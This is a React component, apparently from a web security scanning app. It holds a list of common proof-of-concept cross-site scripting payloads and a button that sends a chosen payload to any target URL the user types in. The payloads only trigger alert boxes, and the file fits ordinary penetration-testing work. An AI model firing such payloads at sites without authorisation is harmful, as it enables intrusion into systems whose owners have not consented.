
import React, { useState } from 'react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from '@/components/ui/use-toast';
import { Bug, Copy, Check } from 'lucide-react';
import { executeHackingTool } from '@/utils/osintTools';

interface XssPayloadsTabProps {
  isRealmode: boolean;
  isExecuting: boolean;
  setIsExecuting: (isExecuting: boolean) => void;
  setToolOutput: (output: string | null) => void;
}

const XssPayloadsTab: React.FC<XssPayloadsTabProps> = ({ 
  isRealmode,
  isExecuting, 
  setIsExecuting, 
  setToolOutput 
}) => {
  const [selectedXssPayload, setSelectedXssPayload] = useState('');
  const [xssTarget, setXssTarget] = useState('');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  
  const xssPayloads = {
    'basic-alert': `<script>alert('XSS')</script>`,
    'image-onerror': `<img src="x" onerror="alert('XSS')">`,
    'svg-onload': `<svg onload="alert('XSS')">`,
    'body-onload': `<body onload="alert('XSS')">`,
    'iframe-src': `<iframe src="javascript:alert('XSS')">`,
    'input-autofocus': `<input autofocus onfocus="alert('XSS')">`,
    'data-uri': `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>`,
    'dom-based': `<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>`
  };
  
  const handleCopyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopySuccess(type);
      setTimeout(() => setCopySuccess(null), 2000);
      toast({
        title: "Copied to clipboard!",
        description: `The ${type} has been copied to your clipboard.`,
      });
    });
  };
  
  const executeXssTool = async () => {
    setIsExecuting(true);
    setToolOutput(null);
    
    try {
      if (!isRealmode) {
        setToolOutput('XSS test simulation (real mode disabled)');
        toast({
          title: "Simulation Mode",
          description: "Enable Real Mode to test XSS vulnerabilities",
        });
        return;
      }
      
      // Execute XSS vulnerability test using selected payload
      const payload = selectedXssPayload ? xssPayloads[selectedXssPayload as keyof typeof xssPayloads] : '';
      
      const result = await executeHackingTool({
        tool: 'xss-scanner',
        options: {
          url: xssTarget,
          payload: payload
        }
      });
      
      toast({
        title: "XSS Test Executed",
        description: "Test executed against target",
      });
      
      if (result?.data) {
        setToolOutput(typeof result.data === 'string' ? result.data : JSON.stringify(result.data, null, 2));
      } else if (result?.error) {
        setToolOutput(`Error: ${result.error}`);
      }
    } catch (error) {
      console.error('Tool execution error:', error);
      setToolOutput(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      
      toast({
        title: "Execution Failed",
        description: error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive"
      });
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <div className="space-y-4">
      <div>
        <Label htmlFor="xss-type">XSS Payload Type</Label>
        <Select 
          value={selectedXssPayload} 
          onValueChange={setSelectedXssPayload}
        >
          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
            <SelectValue placeholder="Select an XSS payload" />
          </SelectTrigger>
          <SelectContent className="bg-scanner-dark border-gray-700">
            {Object.keys(xssPayloads).map((key) => (
              <SelectItem key={key} value={key}>{key}</SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>
      
      {selectedXssPayload && (
        <div className="mt-4">
          <Label>Generated XSS Payload</Label>
          <div className="relative mt-1.5">
            <Textarea 
              readOnly 
              value={xssPayloads[selectedXssPayload as keyof typeof xssPayloads]}
              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
            />
            <Button 
              size="sm" 
              variant="outline" 
              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
              onClick={() => handleCopyToClipboard(
                xssPayloads[selectedXssPayload as keyof typeof xssPayloads], 
                'XSS payload'
              )}
            >
              {copySuccess === 'XSS payload' ? (
                <Check className="h-4 w-4" />
              ) : (
                <Copy className="h-4 w-4" />
              )}
            </Button>
          </div>
          <p className="text-gray-400 text-xs mt-2">
            Use this payload to test for XSS vulnerabilities
          </p>
          
          <div className="mt-4">
            <Label htmlFor="xss-target">Target URL</Label>
            <Textarea
              id="xss-target"
              placeholder="https://example.com/vulnerable-page"
              value={xssTarget}
              onChange={(e) => setXssTarget(e.target.value)}
              className="min-h-16 bg-scanner-dark-alt border-gray-700"
            />
          </div>
          
          <Button
            onClick={executeXssTool}
            disabled={isExecuting || !xssTarget}
            className="mt-4 bg-scanner-primary"
          >
            <Bug className="h-4 w-4 mr-2" />
            {isExecuting ? "Testing..." : "Test XSS Vulnerability"}
          </Button>
        </div>
      )}
    </div>
  );
};

export default XssPayloadsTab;
